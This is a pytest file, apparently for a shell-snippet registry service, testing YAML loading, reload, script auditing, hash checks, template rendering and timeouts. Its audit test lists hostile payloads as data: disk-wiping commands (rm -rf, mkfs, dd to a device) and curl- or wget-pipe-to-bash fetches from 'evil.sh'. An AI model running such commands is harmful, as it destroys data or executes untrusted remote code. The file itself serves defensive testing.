"""Snippet 注册表测试 — 加载 / 安全审计 / 模板渲染 / 超时解析。"""

from __future__ import annotations

import hashlib
import textwrap
from pathlib import Path

import pytest
import yaml

from src.services.snippet_registry import ScriptAuditError, SnippetRegistry

SAFE_SCRIPT = "#!/bin/bash\nes() { curl -s localhost:9200/_cat/indices; }\n"


def _write_config(tmp_path: Path, config: dict, script: str | None = SAFE_SCRIPT) -> Path:
    """写出 snippets.yaml（及可选脚本文件），返回 yaml 路径。"""
    yaml_path = tmp_path / "snippets.yaml"
    yaml_path.write_text(yaml.safe_dump(config, allow_unicode=True), encoding="utf-8")
    if script is not None:
        (tmp_path / "ts-es.sh").write_text(script, encoding="utf-8")
    return yaml_path


def _basic_config(**domain_overrides) -> dict:
    domain = {
        "id": "es",
        "name": "Elasticsearch",
        "icon": "🔍",
        "description": "ES 排查",
        "script_file": "ts-es.sh",
        "tags": ["search"],
        "commands": [
            {
                "id": "health",
                "name": "集群健康",
                "template": "curl -s {{host}}/_cluster/health",
                "params": [
                    {"name": "host", "required": True, "description": "ES 地址"},
                ],
            }
        ],
    }
    domain.update(domain_overrides)
    return {"domains": [domain]}


@pytest.fixture
def registry() -> SnippetRegistry:
    return SnippetRegistry()


# ══════════════════════════════════════════════
# 加载
# ══════════════════════════════════════════════


class TestLoadFromYaml:
    def test_loads_domains_and_commands(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))

        assert registry.domain_count == 1
        domain = registry.get_domain("es")
        assert domain is not None
        assert domain.name == "Elasticsearch"
        assert len(domain.commands) == 1

    def test_missing_file_yields_empty_registry(self, registry, tmp_path):
        registry.load_from_yaml(tmp_path / "does-not-exist.yaml")

        assert registry.domain_count == 0
        assert registry.list_domains() == []

    def test_empty_yaml_yields_empty_registry(self, registry, tmp_path):
        yaml_path = tmp_path / "snippets.yaml"
        yaml_path.write_text("", encoding="utf-8")

        registry.load_from_yaml(yaml_path)

        assert registry.domain_count == 0

    def test_records_config_path(self, registry, tmp_path):
        path = _write_config(tmp_path, _basic_config())
        registry.load_from_yaml(path)
        assert registry.config_path == path

    def test_second_load_replaces_previous(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        assert registry.domain_count == 1

        registry.load_from_yaml(_write_config(tmp_path, {"domains": []}))
        assert registry.domain_count == 0

    def test_domain_without_script_file_loads(self, registry, tmp_path):
        config = _basic_config(script_file="")
        registry.load_from_yaml(_write_config(tmp_path, config, script=None))
        assert registry.domain_count == 1


class TestReload:
    def test_reload_picks_up_changes(self, registry, tmp_path):
        path = _write_config(tmp_path, _basic_config())
        registry.load_from_yaml(path)

        two_domains = _basic_config()
        two_domains["domains"].append(
            {"id": "k8s", "name": "Kubernetes", "script_file": "", "commands": []}
        )
        path.write_text(yaml.safe_dump(two_domains, allow_unicode=True), encoding="utf-8")

        registry.reload()

        assert registry.domain_count == 2

    def test_reload_before_load_is_noop(self, registry):
        registry.reload()  # 不应抛异常
        assert registry.domain_count == 0

    def test_reload_keeps_previous_config_on_failure(self, registry, tmp_path):
        path = _write_config(tmp_path, _basic_config())
        registry.load_from_yaml(path)
        assert registry.domain_count == 1

        # 写入非法 YAML
        path.write_text("domains: [unclosed", encoding="utf-8")
        registry.reload()

        assert registry.domain_count == 1, "热加载失败时应保留上一次的有效配置"
        assert registry.get_domain("es") is not None


# ══════════════════════════════════════════════
# 安全审计
# ══════════════════════════════════════════════


class TestScriptAudit:
    DANGEROUS = [
        ("rm -rf /", "rm -rf /var/log/../../"),
        ("mkfs", "mkfs.ext4 /dev/sda1"),
        ("dd to device", "dd if=/dev/zero of=/dev/sda"),
        ("write to disk", "echo x > /dev/sda"),
        ("curl pipe bash", "curl http://evil.sh | bash"),
        ("wget pipe bash", "wget -qO- http://evil.sh | bash"),
        ("chmod 777 root", "chmod 777 /"),
    ]

    @pytest.mark.parametrize("label,payload", DANGEROUS, ids=[d[0] for d in DANGEROUS])
    def test_dangerous_script_domain_is_skipped(self, registry, tmp_path, label, payload):
        """含危险命令的域应被跳过，而不是让整个加载失败。"""
        script = f"#!/bin/bash\n{payload}\n"
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=script))

        assert registry.domain_count == 0, f"危险模式未被拦截: {label}"

    def test_safe_script_passes(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=SAFE_SCRIPT))
        assert registry.domain_count == 1

    def test_dd_read_is_allowed(self, registry, tmp_path):
        """dd if=... 读取是安全的，不应被拦截。"""
        script = "#!/bin/bash\ndd if=/dev/sda of=/tmp/backup.img bs=1M count=1\n"
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=script))
        assert registry.domain_count == 1

    def test_bad_domain_does_not_block_good_domain(self, registry, tmp_path):
        config = _basic_config()
        config["domains"].append(
            {"id": "k8s", "name": "K8s", "script_file": "ts-k8s.sh", "commands": []}
        )
        (tmp_path / "ts-k8s.sh").write_text("mkfs.ext4 /dev/sdb\n", encoding="utf-8")

        registry.load_from_yaml(_write_config(tmp_path, config))

        assert registry.get_domain("es") is not None
        assert registry.get_domain("k8s") is None

    def test_missing_script_file_skips_audit(self, registry, tmp_path):
        """脚本文件缺失时跳过审计，域仍然加载。"""
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=None))
        assert registry.domain_count == 1


class TestSha256Integrity:
    def test_matching_sha256_passes(self, registry, tmp_path):
        digest = hashlib.sha256(SAFE_SCRIPT.encode()).hexdigest()
        config = _basic_config(script_sha256=digest)

        registry.load_from_yaml(_write_config(tmp_path, config))

        assert registry.domain_count == 1

    def test_mismatched_sha256_skips_domain(self, registry, tmp_path):
        config = _basic_config(script_sha256="0" * 64)

        registry.load_from_yaml(_write_config(tmp_path, config))

        assert registry.domain_count == 0, "篡改的脚本必须被拒绝"

    def test_absent_sha256_skips_integrity_check(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        assert registry.domain_count == 1


class TestScriptAuditErrorType:
    def test_is_a_value_error(self):
        assert issubclass(ScriptAuditError, ValueError)


# ══════════════════════════════════════════════
# 查询
# ══════════════════════════════════════════════


class TestQueries:
    @pytest.fixture
    def loaded(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        return registry

    def test_get_domain_missing_returns_none(self, loaded):
        assert loaded.get_domain("nope") is None

    def test_get_command_found(self, loaded):
        cmd = loaded.get_command("es", "health")
        assert cmd is not None
        assert cmd.name == "集群健康"

    def test_get_command_missing_domain_or_command(self, loaded):
        assert loaded.get_command("nope", "health") is None
        assert loaded.get_command("es", "nope") is None

    def test_domain_summaries_include_command_count(self, loaded):
        summaries = loaded.list_domain_summaries()
        assert len(summaries) == 1
        assert summaries[0].id == "es"
        assert summaries[0].command_count == 1

    def test_get_script_content_reads_file(self, loaded):
        assert loaded.get_script_content("es") == SAFE_SCRIPT

    def test_get_script_content_missing_domain(self, loaded):
        assert loaded.get_script_content("nope") is None

    def test_get_script_content_missing_file(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=None))
        assert registry.get_script_content("es") is None


# ══════════════════════════════════════════════
# 模板渲染
# ══════════════════════════════════════════════


def _template_config(params: list[dict], template: str) -> dict:
    return {
        "domains": [
            {
                "id": "es",
                "name": "ES",
                "script_file": "",
                "commands": [{"id": "c", "name": "C", "template": template, "params": params}],
            }
        ]
    }


class TestResolveCommand:
    def _load(self, registry, tmp_path, params, template):
        registry.load_from_yaml(
            _write_config(tmp_path, _template_config(params, template), script=None)
        )
        return registry

    def test_substitutes_provided_param(self, registry, tmp_path):
        reg = self._load(
            registry, tmp_path, [{"name": "host", "required": True}], "curl {{host}}/_health"
        )
        assert reg.resolve_command("es", "c", {"host": "10.0.0.1"}) == "curl 10.0.0.1/_health"

    def test_uses_default_when_param_absent(self, registry, tmp_path):
        reg = self._load(
            registry, tmp_path, [{"name": "host", "default": "localhost"}], "curl {{host}}"
        )
        assert reg.resolve_command("es", "c") == "curl localhost"

    def test_missing_required_param_returns_none(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [{"name": "host", "required": True}], "curl {{host}}")
        assert reg.resolve_command("es", "c") is None
        assert reg.resolve_command("es", "c", {}) is None

    def test_optional_empty_param_collapses_whitespace(self, registry, tmp_path):
        reg = self._load(
            registry, tmp_path, [{"name": "flag", "default": ""}], "ls {{flag}} /tmp"
        )
        assert reg.resolve_command("es", "c") == "ls /tmp"

    def test_multiple_params(self, registry, tmp_path):
        reg = self._load(
            registry,
            tmp_path,
            [{"name": "h", "required": True}, {"name": "p", "default": "9200"}],
            "curl {{h}}:{{p}}",
        )
        assert reg.resolve_command("es", "c", {"h": "es1"}) == "curl es1:9200"

    def test_unknown_command_returns_none(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [], "echo hi")
        assert reg.resolve_command("es", "missing") is None
        assert reg.resolve_command("missing", "c") is None

    def test_template_without_params(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [], "df -h")
        assert reg.resolve_command("es", "c") == "df -h"


class TestValidateParams:
    def _load(self, registry, tmp_path, params):
        registry.load_from_yaml(
            _write_config(tmp_path, _template_config(params, "cmd {{host}}"), script=None)
        )
        return registry

    def test_no_errors_when_required_provided(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [{"name": "host", "required": True}])
        assert reg.validate_params("es", "c", {"host": "h"}) == []

    def test_reports_missing_required(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [{"name": "host", "required": True}])
        errors = reg.validate_params("es", "c", {})
        assert len(errors) == 1
        assert "host" in errors[0]

    def test_whitespace_only_counts_as_missing(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [{"name": "host", "required": True}])
        assert reg.validate_params("es", "c", {"host": "   "}) != []

    def test_optional_param_never_errors(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [{"name": "host", "required": False}])
        assert reg.validate_params("es", "c", {}) == []

    def test_unknown_command_reports_error(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, [])
        errors = reg.validate_params("es", "nope")
        assert len(errors) == 1
        assert "命令不存在" in errors[0]


# ══════════════════════════════════════════════
# 超时优先级
# ══════════════════════════════════════════════


class TestGetTimeout:
    def _load(self, registry, tmp_path, *, cmd_timeout=None, domain_timeout=None):
        command = {"id": "c", "name": "C", "template": "x"}
        if cmd_timeout is not None:
            command["timeout"] = cmd_timeout
        domain = {"id": "es", "name": "ES", "script_file": "", "commands": [command]}
        if domain_timeout is not None:
            domain["default_timeout"] = domain_timeout

        registry.load_from_yaml(_write_config(tmp_path, {"domains": [domain]}, script=None))
        return registry

    def test_command_timeout_wins(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, cmd_timeout=5, domain_timeout=60)
        assert reg.get_timeout("es", "c") == 5

    def test_falls_back_to_domain_timeout(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, domain_timeout=60)
        assert reg.get_timeout("es", "c") == 60

    def test_falls_back_to_global_default(self, registry, tmp_path):
        reg = self._load(registry, tmp_path)
        assert reg.get_timeout("es", "c") == 30

    def test_unknown_domain_uses_global_default(self, registry, tmp_path):
        reg = self._load(registry, tmp_path)
        assert reg.get_timeout("nope", "c") == 30

    def test_unknown_command_uses_domain_default(self, registry, tmp_path):
        reg = self._load(registry, tmp_path, domain_timeout=45)
        assert reg.get_timeout("es", "nope") == 45


# ══════════════════════════════════════════════
# 脚本指纹与探测命令
# ══════════════════════════════════════════════


class TestScriptFingerprint:
    def test_md5_matches_file_content(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        expected = hashlib.md5(SAFE_SCRIPT.encode()).hexdigest()
        assert registry.get_script_md5("es") == expected

    def test_md5_changes_when_script_changes(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        before = registry.get_script_md5("es")

        (tmp_path / "ts-es.sh").write_text(SAFE_SCRIPT + "# tweak\n", encoding="utf-8")
        after = registry.get_script_md5("es")

        assert before != after

    def test_md5_none_for_unknown_domain(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        assert registry.get_script_md5("nope") is None

    def test_md5_probe_command_targets_domain_script(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        probe = registry.get_md5_probe_command("es")

        assert probe is not None
        assert "/tmp/ts-es.sh" in probe
        assert "__PROBE_MD5_RESULT__" in probe
        assert "md5sum" in probe and "md5 -q" in probe, "需兼容 Linux 与 macOS"

    def test_md5_probe_none_for_unknown_domain(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        assert registry.get_md5_probe_command("nope") is None


class TestScriptVersion:
    def test_extracts_declared_version(self, registry, tmp_path):
        script = textwrap.dedent(
            """\
            #!/bin/bash
            __ES_SNIPPET_VERSION__="1.4.2"
            es() { echo hi; }
            """
        )
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=script))
        assert registry.get_script_version("es") == "1.4.2"

    def test_none_when_no_version_declared(self, registry, tmp_path):
        registry.load_from_yaml(_write_config(tmp_path, _basic_config()))
        assert registry.get_script_version("es") is None

    def test_ignores_other_domain_version(self, registry, tmp_path):
        script = '#!/bin/bash\n__K8S_SNIPPET_VERSION__="9.9.9"\n'
        registry.load_from_yaml(_write_config(tmp_path, _basic_config(), script=script))
        assert registry.get_script_version("es") is None
